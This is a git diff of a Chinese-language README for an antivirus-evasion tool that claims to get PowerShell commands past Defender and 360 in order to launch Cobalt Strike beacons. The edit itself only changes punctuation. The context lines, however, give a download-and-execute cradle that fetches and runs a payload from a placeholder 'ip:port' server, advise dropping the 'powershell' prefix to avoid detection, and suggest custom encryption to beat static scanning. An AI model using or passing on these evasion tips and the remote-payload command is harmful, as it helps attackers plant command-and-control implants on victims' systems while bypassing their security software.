@@ -11,7 +11,7 @@ powershell命令免杀的小工具，可过Defender、360等，可执行上线co
 
 **师傅们注意避免用powershell命令，上线cobaltstrike只需要```Csharp.exe IEX+((new-object+net.webclient).downloadstring('http://ip:port/a'))```裸命令，如果以powershell开头那么还是会调用powershell被360拦截的。**
 
-**这里只是做了个小demo，师傅们可以在demo的基础上来设置自己的命令加密方式，这样可以更有效地避免杀软的静态检测**
+**这里只是做了个小demo，师傅们可以在demo的基础上来设置自己的命令加密方式，这样可以更有效地避免杀软的静态检测。**
 
 ![32430eaf1b8ae7db520dd85e5cc82bf](https://user-images.githubusercontent.com/48757788/198879143-1caaf6d9-2ed9-4894-9233-10ff7aa7ad39.jpg)
 
